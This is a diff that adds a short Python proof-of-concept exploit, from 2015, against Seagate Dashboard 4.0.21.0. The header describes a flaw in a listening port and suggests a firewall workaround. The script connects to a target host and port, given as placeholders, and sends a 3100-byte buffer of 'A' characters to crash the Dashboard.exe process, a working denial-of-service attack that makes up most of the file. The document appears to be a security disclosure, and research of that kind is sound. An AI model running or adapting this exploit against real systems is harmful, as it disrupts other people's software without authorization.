@@ -1,0 +1,49 @@
+#!/usr/bin/env python
+
+
+# Exploit Title: Crash PoC Seagate Dashboard 4.0.21.0
+# Date: 2015-06-20
+# Exploit Author: HexTitan
+# Vendor Homepage: http://www.seagate.com/
+# Software Link: http://www.seagate.com/support/downloads/item/seagate-dashboard-windows-master-dl/
+# Version: 4.0.21.0
+# Tested on: Windows 8.1 32bit
+#
+#Description:
+#
+#The dasboard tool is part of the Seagate software solution for storage. The Dashboard.exe process opens a random port in the 5000-6000 range on each launch.
+#
+#PoC:
+#
+#The attached Python script will send 3100 A's to the target port. This will cause a crash in the Dashboard.exe process.
+#
+#
+#Solution:
+#
+#Until a fix is available, firewall the Dashboard.exe process.
+
+import socket
+import sys
+import os
+ 
+target = '[ip]'
+port = [port]
+
+buffer = 'A'*3100
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+	connect = s.connect((target, port))
+	print '[*] Connected to ' + target
+
+except:
+	print '[-] Unable to connect to ' + target
+	sys.exit(0)
+
+s.send(buffer)
+
+
+print '[!] Malformed request sent\n'
+s.close()
